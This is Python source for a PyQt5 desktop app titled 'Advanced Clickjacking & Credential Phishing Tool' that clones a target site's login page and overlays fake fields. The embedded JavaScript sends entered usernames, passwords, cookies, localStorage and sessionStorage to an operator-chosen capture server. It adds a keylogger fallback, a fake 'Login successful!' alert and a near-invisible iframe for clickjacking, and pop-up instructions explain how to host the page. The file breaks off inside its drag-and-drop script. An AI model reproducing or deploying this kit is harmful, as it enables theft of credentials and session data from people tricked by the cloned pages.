from PyQt5.QtCore import Qt, QUrl, QPoint, QTimer, QThread, pyqtSignal, QEvent, QObject, pyqtSlot
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QHBoxLayout, QPushButton, QLabel, QLineEdit, 
                             QSlider, QSpinBox, QGroupBox, QCheckBox, QTextEdit,
                             QFileDialog, QMessageBox, QTabWidget, QComboBox,
                             QProgressBar, QListWidget, QScrollArea, QFrame)
from PyQt5.QtWebEngineWidgets import QWebEngineView, QWebEnginePage
from PyQt5.QtWebChannel import QWebChannel
from PyQt5.QtGui import QFont, QIcon, QPalette, QColor
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import requests
import sys
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class PositionBridge(QObject):
    """Bridge to communicate between JavaScript and Python"""
    positionChanged = pyqtSignal(str, int, int)
    
    def __init__(self, parent=None):
        super().__init__(parent)
    
    @pyqtSlot(str, int, int)
    def updatePosition(self, elem_id, top, left):
        self.positionChanged.emit(elem_id, top, left)

class ClickjackingTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.target_url = ""
        self.current_mode = "position"
        self.cloned_data = None
        self.iframe_opacity = 0.5
        self.iframe_top = 0
        self.iframe_left = 0
        
        # Setup web channel bridge
        self.bridge = PositionBridge()
        self.bridge.positionChanged.connect(self.handle_position_update)
        
        self.initUI()
    
    def handle_position_update(self, elem_id, top, left):
        """Handle position updates from JavaScript"""
        if elem_id == 'drag-username':
            self.username_top.blockSignals(True)
            self.username_left.blockSignals(True)
            self.username_top.setValue(top)
            self.username_left.setValue(left)
            self.username_top.blockSignals(False)
            self.username_left.blockSignals(False)
        elif elem_id == 'drag-password':
            self.password_top.blockSignals(True)
            self.password_left.blockSignals(True)
            self.password_top.setValue(top)
            self.password_left.setValue(left)
            self.password_top.blockSignals(False)
            self.password_left.blockSignals(False)
        elif elem_id == 'drag-submit':
            self.submit_top.blockSignals(True)
            self.submit_left.blockSignals(True)
            self.submit_top.setValue(top)
            self.submit_left.setValue(left)
            self.submit_top.blockSignals(False)
            self.submit_left.blockSignals(False)
    
    def initUI(self):
        self.setWindowTitle("Advanced Clickjacking & Credential Phishing Tool")
        self.setGeometry(100, 100, 1400, 900)
        
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        main_layout = QHBoxLayout(main_widget)
        
        left_panel = self.create_control_panel()
        main_layout.addWidget(left_panel, 1)
        
        right_panel = self.create_preview_panel()
        main_layout.addWidget(right_panel, 2)
        
        self.apply_dark_theme()
    
    def create_control_panel(self):
        """Create left control panel"""
        panel = QWidget()
        layout = QVBoxLayout(panel)
        
        # Target URL Section
        url_group = QGroupBox("🎯 Target Configuration")
        url_layout = QVBoxLayout()
        
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("Enter target URL (e.g., https://example.com/login)")
        url_layout.addWidget(QLabel("Target URL:"))
        url_layout.addWidget(self.url_input)
        
        url_buttons = QHBoxLayout()
        self.load_btn = QPushButton("🔄 Load Target")
        self.load_btn.clicked.connect(self.load_target)
        self.load_btn.setStyleSheet("background: #4CAF50; color: white; padding: 10px; font-weight: bold;")
        url_buttons.addWidget(self.load_btn)
        
        self.analyze_btn = QPushButton("🔍 Analyze")
        self.analyze_btn.clicked.connect(self.analyze_forms)
        url_buttons.addWidget(self.analyze_btn)
        
        url_layout.addLayout(url_buttons)
        url_group.setLayout(url_layout)
        layout.addWidget(url_group)
        
        # Attack Server Settings
        server_group = QGroupBox("🌐 Capture Server Settings")
        server_layout = QVBoxLayout()
        
        server_layout.addWidget(QLabel("Server IP/Domain:"))
        self.server_ip = QLineEdit()
        self.server_ip.setPlaceholderText("your-server.com or IP:PORT")
        self.server_ip.setText("localhost:8000")
        server_layout.addWidget(self.server_ip)
        
        server_layout.addWidget(QLabel("Capture Endpoint:"))
        self.capture_endpoint = QLineEdit()
        self.capture_endpoint.setText("/capture")
        server_layout.addWidget(self.capture_endpoint)
        
        server_group.setLayout(server_layout)
        layout.addWidget(server_group)
        
        # Overlay Elements Section
        overlay_group = QGroupBox("📝 Overlay Form Elements (Drag in Preview)")
        overlay_layout = QVBoxLayout()
        
        # Username Field
        self.username_check = QCheckBox("✓ Username Field")
        self.username_check.setChecked(True)
        self.username_check.stateChanged.connect(self.update_preview)
        overlay_layout.addWidget(self.username_check)
        
        username_controls = QHBoxLayout()
        username_controls.addWidget(QLabel("Placeholder:"))
        self.username_input = QLineEdit("Username or Email")
        self.username_input.textChanged.connect(self.update_preview)
        username_controls.addWidget(self.username_input)
        overlay_layout.addLayout(username_controls)
        
        username_pos = QHBoxLayout()
        username_pos.addWidget(QLabel("Top:"))
        self.username_top = QSpinBox()
        self.username_top.setRange(-500, 2000)
        self.username_top.setValue(200)
        self.username_top.valueChanged.connect(self.on_spinbox_change)
        username_pos.addWidget(self.username_top)
        
        username_pos.addWidget(QLabel("Left:"))
        self.username_left = QSpinBox()
        self.username_left.setRange(-500, 2000)
        self.username_left.setValue(100)
        self.username_left.valueChanged.connect(self.on_spinbox_change)
        username_pos.addWidget(self.username_left)
        overlay_layout.addLayout(username_pos)
        
        overlay_layout.addWidget(QLabel("─" * 50))
        
        # Password Field
        self.password_check = QCheckBox("✓ Password Field")
        self.password_check.setChecked(True)
        self.password_check.stateChanged.connect(self.update_preview)
        overlay_layout.addWidget(self.password_check)
        
        password_controls = QHBoxLayout()
        password_controls.addWidget(QLabel("Placeholder:"))
        self.password_input = QLineEdit("Password")
        self.password_input.textChanged.connect(self.update_preview)
        password_controls.addWidget(self.password_input)
        overlay_layout.addLayout(password_controls)
        
        password_pos = QHBoxLayout()
        password_pos.addWidget(QLabel("Top:"))
        self.password_top = QSpinBox()
        self.password_top.setRange(-500, 2000)
        self.password_top.setValue(260)
        self.password_top.valueChanged.connect(self.on_spinbox_change)
        password_pos.addWidget(self.password_top)
        
        password_pos.addWidget(QLabel("Left:"))
        self.password_left = QSpinBox()
        self.password_left.setRange(-500, 2000)
        self.password_left.setValue(100)
        self.password_left.valueChanged.connect(self.on_spinbox_change)
        password_pos.addWidget(self.password_left)
        overlay_layout.addLayout(password_pos)
        
        overlay_layout.addWidget(QLabel("─" * 50))
        
        # Submit Button
        self.submit_check = QCheckBox("✓ Submit Button")
        self.submit_check.setChecked(True)
        self.submit_check.stateChanged.connect(self.update_preview)
        overlay_layout.addWidget(self.submit_check)
        
        submit_controls = QHBoxLayout()
        submit_controls.addWidget(QLabel("Button Text:"))
        self.submit_text = QLineEdit("Sign In")
        self.submit_text.textChanged.connect(self.update_preview)
        submit_controls.addWidget(self.submit_text)
        overlay_layout.addLayout(submit_controls)
        
        submit_pos = QHBoxLayout()
        submit_pos.addWidget(QLabel("Top:"))
        self.submit_top = QSpinBox()
        self.submit_top.setRange(-500, 2000)
        self.submit_top.setValue(330)
        self.submit_top.valueChanged.connect(self.on_spinbox_change)
        submit_pos.addWidget(self.submit_top)
        
        submit_pos.addWidget(QLabel("Left:"))
        self.submit_left = QSpinBox()
        self.submit_left.setRange(-500, 2000)
        self.submit_left.setValue(100)
        self.submit_left.valueChanged.connect(self.on_spinbox_change)
        submit_pos.addWidget(self.submit_left)
        overlay_layout.addLayout(submit_pos)
        
        overlay_group.setLayout(overlay_layout)
        layout.addWidget(overlay_group)
        
        # IFrame Settings
        iframe_group = QGroupBox("🖼️ IFrame Settings")
        iframe_layout = QVBoxLayout()
        
        opacity_layout = QHBoxLayout()
        opacity_layout.addWidget(QLabel("Opacity (Position Mode):"))
        self.opacity_slider = QSlider(Qt.Horizontal)
        self.opacity_slider.setRange(0, 100)
        self.opacity_slider.setValue(50)
        self.opacity_slider.valueChanged.connect(self.on_opacity_change)
        opacity_layout.addWidget(self.opacity_slider)
        self.opacity_label = QLabel("50%")
        opacity_layout.addWidget(self.opacity_label)
        iframe_layout.addLayout(opacity_layout)
        
        iframe_pos = QHBoxLayout()
        iframe_pos.addWidget(QLabel("IFrame Top:"))
        self.iframe_top_spin = QSpinBox()
        self.iframe_top_spin.setRange(-1000, 1000)
        self.iframe_top_spin.setValue(0)
        self.iframe_top_spin.valueChanged.connect(self.on_iframe_position_change)
        iframe_pos.addWidget(self.iframe_top_spin)
        
        iframe_pos.addWidget(QLabel("Left:"))
        self.iframe_left_spin = QSpinBox()
        self.iframe_left_spin.setRange(-1000, 1000)
        self.iframe_left_spin.setValue(0)
        self.iframe_left_spin.valueChanged.connect(self.on_iframe_position_change)
        iframe_pos.addWidget(self.iframe_left_spin)
        iframe_layout.addLayout(iframe_pos)
        
        iframe_group.setLayout(iframe_layout)
        layout.addWidget(iframe_group)
        
        # Mode Toggle
        mode_layout = QHBoxLayout()
        self.position_mode_btn = QPushButton("📍 Position Mode")
        self.position_mode_btn.setCheckable(True)
        self.position_mode_btn.setChecked(True)
        self.position_mode_btn.clicked.connect(self.toggle_mode)
        self.position_mode_btn.setStyleSheet("background: #FF9800; color: white; padding: 12px; font-weight: bold;")
        mode_layout.addWidget(self.position_mode_btn)
        
        self.attack_mode_btn = QPushButton("⚡ Attack Mode")
        self.attack_mode_btn.setCheckable(True)
        self.attack_mode_btn.clicked.connect(self.toggle_mode)
        mode_layout.addWidget(self.attack_mode_btn)
        
        layout.addLayout(mode_layout)
        
        # Export Buttons
        export_layout = QVBoxLayout()
        
        self.export_btn = QPushButton("💾 Export Full Clone (Recommended)")
        self.export_btn.clicked.connect(self.export_full_clone)
        self.export_btn.setStyleSheet("background: #2196F3; color: white; padding: 12px; font-weight: bold;")
        export_layout.addWidget(self.export_btn)
        
        self.export_iframe_btn = QPushButton("💾 Export with IFrame")
        self.export_iframe_btn.clicked.connect(self.export_html)
        export_layout.addWidget(self.export_iframe_btn)
        
        self.copy_btn = QPushButton("📋 Copy Code")
        self.copy_btn.clicked.connect(self.copy_code)
        export_layout.addWidget(self.copy_btn)
        
        self.server_code_btn = QPushButton("🖥️ Generate Server Code")
        self.server_code_btn.clicked.connect(self.generate_server_code)
        self.server_code_btn.setStyleSheet("background: #9C27B0; color: white; padding: 12px; font-weight: bold;")
        export_layout.addWidget(self.server_code_btn)
        
        layout.addLayout(export_layout)
        
        layout.addStretch()
        return panel
    
    def create_preview_panel(self):
        """Create right preview panel"""
        panel = QWidget()
        layout = QVBoxLayout(panel)
        
        tabs = QTabWidget()
        
        # Preview Tab
        preview_widget = QWidget()
        preview_layout = QVBoxLayout(preview_widget)
        
        self.web_view = QWebEngineView()
        
        # Setup web channel
        self.channel = QWebChannel()
        self.channel.registerObject('bridge', self.bridge)
        self.web_view.page().setWebChannel(self.channel)
        
        preview_layout.addWidget(self.web_view)
        tabs.addTab(preview_widget, "🖥️ Live Preview")
        
        # Code Tab
        code_widget = QWidget()
        code_layout = QVBoxLayout(code_widget)
        
        self.code_view = QTextEdit()
        self.code_view.setReadOnly(True)
        self.code_view.setFont(QFont("Courier New", 10))
        code_layout.addWidget(self.code_view)
        
        tabs.addTab(code_widget, "💻 HTML Code")
        
        # Server Code Tab
        server_widget = QWidget()
        server_layout = QVBoxLayout(server_widget)
        
        self.server_view = QTextEdit()
        self.server_view.setReadOnly(True)
        self.server_view.setFont(QFont("Courier New", 10))
        server_layout.addWidget(self.server_view)
        
        tabs.addTab(server_widget, "🖥️ Server Code")
        
        # Analysis Tab
        analysis_widget = QWidget()
        analysis_layout = QVBoxLayout(analysis_widget)
        
        self.analysis_view = QTextEdit()
        self.analysis_view.setReadOnly(True)
        analysis_layout.addWidget(self.analysis_view)
        
        tabs.addTab(analysis_widget, "🔍 Analysis")
        
        layout.addWidget(tabs)
        return panel
    
    def on_spinbox_change(self):
        """Called when spinbox values change"""
        if hasattr(self, 'web_view'):
            self.update_element_positions()
    
    def update_element_positions(self):
        """Update element positions in the preview via JavaScript"""
        js_code = f"""
        (function() {{
            var username = document.querySelector('[data-elem-id="drag-username"]');
            if (username) {{
                username.style.top = '{self.username_top.value()}px';
                username.style.left = '{self.username_left.value()}px';
            }}
            
            var password = document.querySelector('[data-elem-id="drag-password"]');
            if (password) {{
                password.style.top = '{self.password_top.value()}px';
                password.style.left = '{self.password_left.value()}px';
            }}
            
            var submit = document.querySelector('[data-elem-id="drag-submit"]');
            if (submit) {{
                submit.style.top = '{self.submit_top.value()}px';
                submit.style.left = '{self.submit_left.value()}px';
            }}
        }})();
        """
        self.web_view.page().runJavaScript(js_code)
    
    def load_target(self):
        """Load target website"""
        url = self.url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "Error", "Please enter a target URL")
            return
        
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        self.target_url = url
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            response.raise_for_status()
            
            soup = BeautifulSoup(response.text, 'html.parser')
            login_fields = self.extract_login_fields(soup)
            
            self.cloned_data = {
                'html': response.text,
                'soup': soup,
                'login_fields': login_fields,
                'url': url
            }
            
            analysis = f"✅ Successfully loaded: {url}\n\n"
            analysis += f"📋 Forms found: {len(soup.find_all('form'))}\n"
            analysis += f"🔑 Login fields detected: {len([f for f in login_fields.values() if f])}\n\n"
            
            if any(login_fields.values()):
                analysis += "Detected Fields:\n"
                for field_type, field_info in login_fields.items():
                    if field_info:
                        analysis += f"  • {field_type}: {field_info.get('name', 'N/A')}\n"
            
            self.analysis_view.setText(analysis)
            self.update_preview()
            
            QMessageBox.information(self, "Success", 
                "Target loaded successfully!\n\n" +
                "🎯 HOW TO USE:\n\n" +
                "1. Look at the preview - you'll see colored 'DRAG ME' handles\n" +
                "2. Click and hold the handle, then drag to position\n" +
                "3. Release mouse to drop in place\n" +
                "4. Use arrow keys for fine-tuning (Shift+Arrow for 10px moves)\n" +
                "5. Align over the target form fields visible below\n" +
                "6. Switch to Attack Mode when ready\n" +
                "7. Export Full Clone for deployment")
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to load target:\n{str(e)}")
    
    def extract_login_fields(self, soup):
        """Extract login form fields"""
        fields = {
            'username': None,
            'password': None,
            'submit': None
        }
        
        password_input = soup.find('input', {'type': 'password'})
        if password_input:
            fields['password'] = {
                'name': password_input.get('name', 'password'),
                'id': password_input.get('id', ''),
                'placeholder': password_input.get('placeholder', '')
            }
            
            form = password_input.find_parent('form')
            if form:
                text_inputs = form.find_all('input', {'type': ['text', 'email']})
                if text_inputs:
                    username = text_inputs[0]
                    fields['username'] = {
                        'name': username.get('name', 'username'),
                        'id': username.get('id', ''),
                        'placeholder': username.get('placeholder', '')
                    }
                
                submit = form.find(['button', 'input'], {'type': 'submit'})
                if submit:
                    fields['submit'] = {
                        'text': submit.get_text(strip=True) or submit.get('value', 'Submit')
                    }
        
        return fields
    
    def analyze_forms(self):
        """Analyze forms on target page"""
        if not self.cloned_data:
            QMessageBox.warning(self, "Error", "Please load a target first")
            return
        
        soup = self.cloned_data['soup']
        forms = soup.find_all('form')
        
        analysis = f"🔍 Form Analysis for: {self.target_url}\n\n"
        analysis += f"Total forms found: {len(forms)}\n\n"
        
        for i, form in enumerate(forms, 1):
            analysis += f"━━━ Form #{i} ━━━\n"
            analysis += f"Action: {form.get('action', 'N/A')}\n"
            analysis += f"Method: {form.get('method', 'GET').upper()}\n"
            
            inputs = form.find_all('input')
            analysis += f"Input fields: {len(inputs)}\n"
            
            for inp in inputs:
                input_type = inp.get('type', 'text')
                input_name = inp.get('name', 'N/A')
                input_placeholder = inp.get('placeholder', '')
                analysis += f"  • {input_type}: {input_name}"
                if input_placeholder:
                    analysis += f" ('{input_placeholder}')"
                analysis += "\n"
            
            analysis += "\n"
        
        self.analysis_view.setText(analysis)
    
    def on_opacity_change(self, value):
        """Handle opacity slider change"""
        self.iframe_opacity = value / 100
        self.opacity_label.setText(f"{value}%")
        self.update_preview()
    
    def on_iframe_position_change(self):
        """Handle iframe position change"""
        self.iframe_top = self.iframe_top_spin.value()
        self.iframe_left = self.iframe_left_spin.value()
        self.update_preview()
    
    def toggle_mode(self):
        """Toggle between position and attack mode"""
        if self.sender() == self.position_mode_btn:
            self.current_mode = "position"
            self.position_mode_btn.setChecked(True)
            self.attack_mode_btn.setChecked(False)
            self.position_mode_btn.setStyleSheet("background: #FF9800; color: white; padding: 12px; font-weight: bold;")
            self.attack_mode_btn.setStyleSheet("")
        else:
            self.current_mode = "attack"
            self.attack_mode_btn.setChecked(True)
            self.position_mode_btn.setChecked(False)
            self.attack_mode_btn.setStyleSheet("background: #F44336; color: white; padding: 12px; font-weight: bold;")
            self.position_mode_btn.setStyleSheet("")
        
        self.update_preview()
    
    def export_full_clone(self):
        """Export with full page clone instead of iframe"""
        if not self.cloned_data:
            QMessageBox.warning(self, "Error", "Please load a target first")
            return
        
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Save Cloned Page", "phishing_page.html", "HTML Files (*.html)"
        )
        
        if file_path:
            try:
                soup = BeautifulSoup(self.cloned_data['html'], 'html.parser')
                
                # Remove original forms
                for form in soup.find_all('form'):
                    form.decompose()
                
                # Remove original scripts that might interfere
                for script in soup.find_all('script'):
                    src = script.get('src', '')
                    # Keep external scripts but remove inline ones that might interfere
                    if not src:
                        script.decompose()
                
                # Fix all URLs to absolute
                for tag in soup.find_all(['img', 'link', 'script', 'a', 'form']):
                    for attr in ['src', 'href', 'action']:
                        if tag.has_attr(attr):
                            url = tag[attr]
                            if url and not url.startswith(('http://', 'https://', 'data:', '//', '#', 'javascript:')):
                                tag[attr] = urljoin(self.target_url, url)
                
                # Get server info
                server_url = f"http://{self.server_ip.text()}{self.capture_endpoint.text()}"
                
                # Build phishing overlay with credential stealing
                phishing_overlay = f'''
<style>
.phishing-overlay {{
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 999999;
    pointer-events: none;
}}
.phishing-overlay input,
.phishing-overlay button {{
    pointer-events: auto;
    position: absolute;
}}
</style>

<form method="POST" action="{server_url}" class="phishing-overlay" id="phish-form">
    <input type="text" 
           name="username" 
           id="phish-username"
           placeholder="{self.username_input.text()}"
           style="top: {self.username_top.value()}px; 
                  left: {self.username_left.value()}px;
                  padding: 14px; 
                  width: 320px; 
                  font-size: 15px; 
                  border: 2px solid #ddd; 
                  border-radius: 6px; 
                  background: white;" 
           required>
    
    <input type="password" 
           name="password" 
           id="phish-password"
           placeholder="{self.password_input.text()}"
           style="top: {self.password_top.value()}px; 
                  left: {self.password_left.value()}px;
                  padding: 14px; 
                  width: 320px; 
                  font-size: 15px; 
                  border: 2px solid #ddd; 
                  border-radius: 6px; 
                  background: white;" 
           required>
    
    <button type="submit"
            id="phish-submit"
            style="top: {self.submit_top.value()}px; 
                   left: {self.submit_left.value()}px;
                   padding: 14px 40px; 
                   background: #4CAF50; 
                   color: white; 
                   border: none; 
                   border-radius: 6px; 
                   font-size: 16px; 
                   cursor: pointer;">
        {self.submit_text.text()}
    </button>
</form>

<script>
// Advanced credential capture with multiple methods
(function() {{
    var captured = false;
    
    // Method 1: Form submission hijacking
    document.getElementById('phish-form').addEventListener('submit', function(e) {{
        e.preventDefault();
        
        var username = document.getElementById('phish-username').value;
        var password = document.getElementById('phish-password').value;
        
        // Send to server
        var data = {{
            username: username,
            password: password,
            url: window.location.href,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage)
        }};
        
        // Use fetch API
        fetch('{server_url}', {{
            method: 'POST',
            headers: {{
                'Content-Type': 'application/json',
            }},
            body: JSON.stringify(data),
            mode: 'no-cors'
        }}).then(function() {{
            console.log('Credentials sent');
        }}).catch(function(err) {{
            console.error('Send failed:', err);
        }});
        
        // Also use image beacon as backup
        var img = new Image();
        img.src = '{server_url}?u=' + encodeURIComponent(username) + 
                  '&p=' + encodeURIComponent(password);
        
        // Simulate successful login
        setTimeout(function() {{
            alert('Login successful!');
            // Optionally redirect
            // window.location.href = '{self.target_url}';
        }}, 500);
        
        captured = true;
    }});
    
    // Method 2: Keylogger as backup
    var keylog = '';
    document.addEventListener('keypress', function(e) {{
        if (!captured) {{
            keylog += e.key;
            if (keylog.length > 20) {{
                fetch('{server_url}', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{keylog: keylog, type: 'keylogger'}}),
                    mode: 'no-cors'
                }});
                keylog = '';
            }}
        }}
    }});
    
    // Method 3: Monitor password field changes
    var passField = document.getElementById('phish-password');
    if (passField) {{
        passField.addEventListener('change', function() {{
            var username = document.getElementById('phish-username').value;
            var password = this.value;
            
            if (username && password) {{
                fetch('{server_url}', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        username: username,
                        password: password,
                        type: 'onchange'
                    }}),
                    mode: 'no-cors'
                }});
            }}
        }});
    }}
    
    console.log('Phishing overlay active');
}})();
</script>
'''
                
                # Insert before </body>
                if soup.body:
                    soup.body.append(BeautifulSoup(phishing_overlay, 'html.parser'))
                
                # Write to file
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(str(soup))
                
                QMessageBox.information(self, "Success", 
                    f"✓ Full clone exported successfully!\n\n" +
                    f"File: {file_path}\n\n" +
                    f"Capture Server: {server_url}\n\n" +
                    "⚠️ IMPORTANT:\n" +
                    "1. This page looks IDENTICAL to the original\n" +
                    "2. Start your capture server before testing\n" +
                    "3. Host this HTML on your server\n" +
                    "4. Credentials will be sent to your capture endpoint\n\n" +
                    "Use 'Generate Server Code' to get the server script!")
                    
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Export failed:\n{str(e)}")
    
    def generate_html(self, for_server=False):
        """Generate HTML code with iframe"""
        username_name = 'username'
        password_name = 'password'
        
        if self.cloned_data and self.cloned_data['login_fields']:
            fields = self.cloned_data['login_fields']
            if fields['username']:
                username_name = fields['username']['name']
            if fields['password']:
                password_name = fields['password']['name']
        
        overlays = []
        
        if self.username_check.isChecked():
            overlays.append({
                'type': 'input',
                'id': 'drag-username',
                'name': username_name,
                'placeholder': self.username_input.text(),
                'input_type': 'text',
                'top': self.username_top.value(),
                'left': self.username_left.value()
            })
        
        if self.password_check.isChecked():
            overlays.append({
                'type': 'input',
                'id': 'drag-password',
                'name': password_name,
                'placeholder': self.password_input.text(),
                'input_type': 'password',
                'top': self.password_top.value(),
                'left': self.password_left.value()
            })
        
        if self.submit_check.isChecked():
            overlays.append({
                'type': 'button',
                'id': 'drag-submit',
                'text': self.submit_text.text(),
                'top': self.submit_top.value(),
                'left': self.submit_left.value()
            })
        
        overlay_html = ""
        for overlay in overlays:
            if overlay['type'] == 'input':
                overlay_html += f'''
            <div class="draggable-wrapper" data-elem-id="{overlay['id']}" 
                 style="position: absolute; 
                        top: {overlay['top']}px; 
                        left: {overlay['left']}px;
                        z-index: 10000;
                        cursor: move;">
                <div class="drag-handle">⋮⋮ DRAG ME ⋮⋮</div>
                <input type="{overlay['input_type']}" 
                       id="{overlay['id']}"
                       name="{overlay['name']}"
                       placeholder="{overlay['placeholder']}"
                       required
                       style="padding: 14px 16px;
                              width: 320px;
                              font-size: 15px;
                              border: 2px solid #4CAF50;
                              border-radius: 8px;
                              box-shadow: 0 4px 12px rgba(76, 175, 80, 0.2);
                              display: block;">
            </div>
            '''
            elif overlay['type'] == 'button':
                overlay_html += f'''
            <div class="draggable-wrapper" data-elem-id="{overlay['id']}"
                 style="position: absolute; 
                        top: {overlay['top']}px; 
                        left: {overlay['left']}px;
                        z-index: 10000;
                        cursor: move;">
                <div class="drag-handle">⋮⋮ DRAG ME ⋮⋮</div>
                <button type="submit"
                        id="{overlay['id']}"
                        style="padding: 16px 48px;
                               background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
                               color: white;
                               border: none;
                               border-radius: 8px;
                               font-size: 17px;
                               font-weight: bold;
                               cursor: pointer;
                               box-shadow: 0 6px 20px rgba(76, 175, 80, 0.4);">
                    {overlay['text']}
                </button>
            </div>
            '''
        
        opacity = self.iframe_opacity if self.current_mode == "position" else 0.003
        server_url = f"http://{self.server_ip.text()}{self.capture_endpoint.text()}" if for_server else "#"
        
        webchannel_script = ""
        if not for_server:
            webchannel_script = '<script src="qrc:///qtwebchannel/qwebchannel.js"></script>'
        
        html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login</title>
    {webchannel_script}
    
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        html, body {{
            width: 100%;
            height: 100%;
            overflow: hidden;
        }}
        
        iframe {{
            position: fixed;
            top: {self.iframe_top}px;
            left: {self.iframe_left}px;
            width: 100%;
            height: 100%;
            border: {'3px solid #F44336' if self.current_mode == 'position' else 'none'};
            opacity: {opacity};
            z-index: 500;
            pointer-events: {'none' if self.current_mode == 'attack' else 'auto'};
        }}
        
        .overlay-container {{
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999;
            pointer-events: none;
        }}
        
        .draggable-wrapper {{
            pointer-events: auto;
        }}
        
        .draggable-wrapper.dragging {{
            opacity: 0.8;
            z-index: 99999 !important;
            cursor: grabbing !important;
        }}
        
        .drag-handle {{
            position: absolute;
            top: -35px;
            left: 50%;
            transform: translateX(-50%);
            background: linear-gradient(135deg, #FF5722 0%, #F44336 100%);
            color: white;
            padding: 8px 20px;
            border-radius: 12px 12px 0 0;
            font-size: 13px;
            font-weight: bold;
            cursor: grab;
            user-select: none;
            box-shadow: 0 -4px 12px rgba(255, 87, 34, 0.6);
            display: {'block' if self.current_mode == 'position' else 'none'};
            white-space: nowrap;
            animation: pulse 2s ease-in-out infinite;
            z-index: 1;
        }}
        
        .drag-handle:active {{
            cursor: grabbing;
        }}
        
        @keyframes pulse {{
            0%, 100% {{ 
                background: linear-gradient(135deg, #FF5722 0%, #F44336 100%);
                box-shadow: 0 -4px 12px rgba(255, 87, 34, 0.6);
            }}
            50% {{ 
                background: linear-gradient(135deg, #F44336 0%, #D32F2F 100%);
                box-shadow: 0 -4px 16px rgba(255, 87, 34, 0.9);
            }}
        }}
        
        .draggable-wrapper input,
        .draggable-wrapper button {{
            display: block;
            pointer-events: auto;
        }}
        
        .warning {{
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: linear-gradient(135deg, #F44336 0%, #D32F2F 100%);
            color: white;
            padding: 18px 50px;
            border-radius: 12px;
            font-weight: bold;
            font-size: 19px;
            z-index: 99999;
            display: {'block' if self.current_mode == 'position' else 'none'};
            box-shadow: 0 8px 24px rgba(244, 67, 54, 0.6);
            animation: blink 1.5s ease-in-out infinite;
            border: 3px solid rgba(255, 255, 255, 0.3);
        }}
        
        @keyframes blink {{
            0%, 100% {{ 
                opacity: 1; 
                transform: translateX(-50%) scale(1);
            }}
            50% {{ 
                opacity: 0.85; 
                transform: translateX(-50%) scale(1.02);
            }}
        }}
        
        .position-info {{
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(33, 33, 33, 0.97);
            color: #4CAF50;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            z-index: 99999;
            display: {'block' if self.current_mode == 'position' else 'none'};
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
            max-width: 380px;
            border: 2px solid #4CAF50;
        }}
        
        .position-info div {{
            line-height: 1.6;
        }}
    </style>
</head>
<body>
    <div class="warning">⚠️ DRAG MODE ACTIVE - Click & Drag Elements to Align ⚠️</div>
    
    <iframe src="{self.target_url}" 
            sandbox="allow-forms allow-scripts allow-same-origin"
            title="Target Frame">
    </iframe>
    
    <div class="overlay-container">
        <form method="post" action="{server_url}" onsubmit="return handleSubmit(event);" id="phish-form">
            {overlay_html}
        </form>
    </div>
    
    <div class="position-info">
        <div style="font-weight: bold; margin-bottom: 12px; font-size: 15px; color: #FFD700;">💡 DRAG INSTRUCTIONS:</div>
        <div style="margin-bottom: 8px;">• <strong>Click & Hold</strong> the colored handle</div>
        <div style="margin-bottom: 8px;">• <strong>Drag</strong> to position over target fields</div>
        <div style="margin-bottom: 8px;">• <strong>Arrow Keys</strong> for fine-tuning (1px)</div>
        <div style="margin-bottom: 8px;">• <strong>Shift + Arrow</strong> for 10px moves</div>
        <div style="margin-top: 15px; padding-top: 15px; border-top: 2px solid #4CAF50;">
            <div id="current-pos" style="color: #FFD700; font-weight: bold;">Click an element to see position...</div>
        </div>
    </div>
    
    <script>
        var bridge = null;
        
        {'if (typeof QWebChannel !== "undefined") {' if not for_server else '// QWebChannel disabled for export'}
            new QWebChannel(qt.webChannelTransport, function(channel) {{
                bridge = channel.objects.bridge;
                console.log('✓ Bridge connected to Python');
            }});
        {'}' if not for_server else ''}
        
        let draggedElement = null;
        let offsetX = 0;
        let offsetY = 0;
        let selectedElement = null;
        
        document.querySelectorAll('.draggable-wrapper').forEach(wrapper => {{
            const handle = wrapper.querySelector('.drag-handle');
            
            wrapper.addEventListener('mousedown', function(e) {{
                if (e.target === wrapper || e.target === handle || e.target.classList.contains('drag-handle')) {{
                    draggedElement = wrapper;
                    selectedElement = wrapper;
                    wrapper.classList.add('dragging');
                    
                    const rect = wrapper.getBoundingClientRect();
                    offsetX = e.clientX - rect.left;
                    offsetY = e.clientY - rect.top;
                    
                    updatePositionDisplay(wrapper);
                    
                    e.preventDefault();
                    e.stopPropagation();
                }}
            }});
            
            const inputs = wrapper.querySelectorAll('input, button');
            inputs.forEach(input => {{
                input.addEventListener('mousedown', function(e) {{
                    e.stopPropagation();
                }});
            }});
        }});
        
        document.addEventListener('mousemove', function(e) {{
            if (draggedElement) {{
